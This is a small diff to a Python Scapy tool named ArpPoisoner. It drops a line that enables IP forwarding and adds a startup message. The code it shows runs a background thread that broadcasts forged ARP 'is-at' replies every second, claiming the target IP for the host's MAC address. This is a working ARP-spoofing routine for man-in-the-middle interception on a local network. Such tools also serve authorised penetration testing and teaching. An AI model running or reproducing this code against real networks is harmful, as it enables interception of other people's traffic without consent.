@@ -6,7 +6,6 @@ from time import sleep
 
 def ArpPoisoner(args):
     def ArpPoison():
-        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
         s = conf.L2socket(iface=args.interface)
         while True:
             sleep(1)
@@ -14,4 +13,5 @@ def ArpPoisoner(args):
             s.send(Ether(src=args.host_mac, dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=args.host_mac, psrc=args.target_ip, op="is-at"))      
     t = threading.Thread(name='ArpPoisoner', target=ArpPoison)
     t.setDaemon(True)
+    print ('\033[92m[+]\tStarting ARP poisoner\033[0m')
     t.start()
